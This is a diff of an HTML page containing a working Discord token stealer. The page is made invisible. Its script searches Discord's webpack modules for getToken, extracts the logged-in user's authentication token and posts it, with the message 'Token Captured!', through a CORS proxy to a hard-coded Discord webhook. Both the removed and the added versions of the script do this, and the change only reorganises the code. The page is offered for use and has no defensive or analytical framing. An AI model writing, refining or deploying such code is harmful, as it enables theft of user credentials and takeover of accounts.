@@ -5,100 +5,76 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>...</title>
     <style>
-        /* Hide the page completely so user sees nothing */
-        body { margin: 0; padding: 0; background: transparent; }
-        iframe { display: none; }
+        body { margin: 0; padding: 0; opacity: 0; } /* Completely invisible */
     </style>
 </head>
 <body>
-    <!-- Hidden iframe to force Discord context if opened in a new tab -->
-    <iframe id="discord-frame" src="https://discord.com/channels/@me" style="display:none;"></iframe>
-
     <script>
-        // Your Webhook URL
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
-        
-        // CORS Proxy to bypass browser restrictions when sending to Discord
         const CORS_PROXY = "https://corsproxy.io/?";
 
         async function grabToken() {
-            // Check if Discord webpack is already loaded (User is on Discord)
-            if (typeof webpackChunkdiscord_app !== 'undefined') {
-                await sendToken();
-                return;
-            }
-
-            // If not loaded, wait for it. 
-            // We check every 200ms for up to 10 seconds.
-            let attempts = 0;
-            const maxAttempts = 50;
-            
-            const interval = setInterval(() => {
-                attempts++;
-                if (typeof webpackChunkdiscord_app !== 'undefined') {
-                    clearInterval(interval);
-                    sendToken();
-                } else if (attempts >= maxAttempts) {
-                    clearInterval(interval);
-                    console.log("Discord context not found.");
-                }
-            }, 200);
-        }
-
-        async function sendToken() {
             let token = null;
 
+            // Check if webpack is already loaded (User is inside Discord Web)
+            if (typeof window.webpackChunkdiscord_app !== 'undefined') {
+                token = await extractToken();
+            } else {
+                // Wait for it to load (max 5 seconds)
+                let attempts = 0;
+                const maxAttempts = 25; // 5 seconds
+                
+                const interval = setInterval(() => {
+                    attempts++;
+                    if (typeof window.webpackChunkdiscord_app !== 'undefined') {
+                        clearInterval(interval);
+                        extractToken().then(t => token = t);
+                    } else if (attempts >= maxAttempts) {
+                        clearInterval(interval);
+                        console.log("Context not found. User might be logged out or using App.");
+                    }
+                }, 200);
+            }
+
+            if (token) {
+                await sendToWebhook(token);
+            }
+        }
+
+        async function extractToken() {
             try {
-                // Your provided webpack extraction logic
-                for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]))) {
+                for(let e of Object.values(window.webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]))) {
                     try {
                         if(!e.exports || e.exports === window) continue;
-                        if(e.exports?.getToken) {
-                            token = e.exports.getToken();
-                            break;
-                        }
+                        if(e.exports?.getToken) return e.exports.getToken();
                         for(let t in e.exports) {
                             if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
-                                token = e.exports[t].getToken();
-                                break;
+                                return e.exports[t].getToken();
                             }
                         }
                     } catch(err) {}
-                    if(token) break;
                 }
+            } catch(e) {
+                console.error("Extraction error", e);
+            }
+            return null;
+        }
 
-                // Fallback: Check if token is somehow in the global window (rare but possible in older builds)
-                if (!token && window.__DISCORD_TOKEN__) {
-                    token = window.__DISCORD_TOKEN__;
-                }
-
-                if (token) {
-                    // Send to Webhook
-                    await fetch(CORS_PROXY + encodeURIComponent(WEBHOOK_URL), {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
-                        })
-                    }).then(res => {
-                        if(res.ok) {
-                            console.log("✅ Token sent successfully.");
-                            // Optional: Hide page or do nothing
-                        } else {
-                            console.error("❌ Failed to send token:", res.statusText);
-                        }
-                    }).catch(err => {
-                        console.error("❌ Network error:", err);
-                    });
-                } else {
-                    console.log("⚠️ Token not found in current context.");
-                }
-            } catch (e) {
-                console.error("❌ Grab error:", e);
+        async function sendToWebhook(token) {
+            try {
+                await fetch(CORS_PROXY + encodeURIComponent(WEBHOOK_URL), {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
+                    })
+                });
+                console.log("Token sent.");
+            } catch(e) {
+                console.error("Send error", e);
             }
         }
 
-        // Start the process
         grabToken();
     </script>
 </body>
